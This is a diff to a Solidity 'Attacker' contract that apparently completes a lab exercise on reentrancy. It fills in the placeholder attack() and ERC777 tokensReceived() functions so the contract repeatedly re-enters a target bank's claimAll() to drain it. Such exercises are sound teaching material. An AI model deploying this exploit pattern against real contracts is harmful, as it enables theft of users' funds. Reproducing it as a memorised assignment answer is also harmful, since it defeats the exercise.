@@ -34,11 +34,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 	   The main attack function that should start the reentrancy attack
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
-	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO START ATTACK GOES HERE
+    function attack(uint256 amt) payable public {
+        require(address(bank) != address(0), "Target bank not set");
         bank.deposit{value: amt}();
-        bank.withdraw(address(this));
+        bank.claimAll();  // Changed from withdraw to claimAll
         emit Recurse(depth);
 	}
 
@@ -54,23 +53,22 @@ contract Attacker is AccessControl, IERC777Recipient {
 	/*
 	   This is the function that gets called when the Bank contract sends MCITR tokens
 	*/
-	function tokensReceived(
-		address operator,
-		address from,
-		address to,
-		uint256 amount,
-		bytes calldata userData,
-		bytes calldata operatorData
-	) external {
-		//YOUR CODE TO RECURSE GOES HERE
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external {
         if (depth < max_depth) {
             depth++;
             bank.deposit{value: amount}();
-            bank.withdraw(address(this));
+            bank.claimAll();  // Changed from withdraw to claimAll
         }
         depth--;
         emit Recurse(depth);
-	}
+    }
 
 }
 
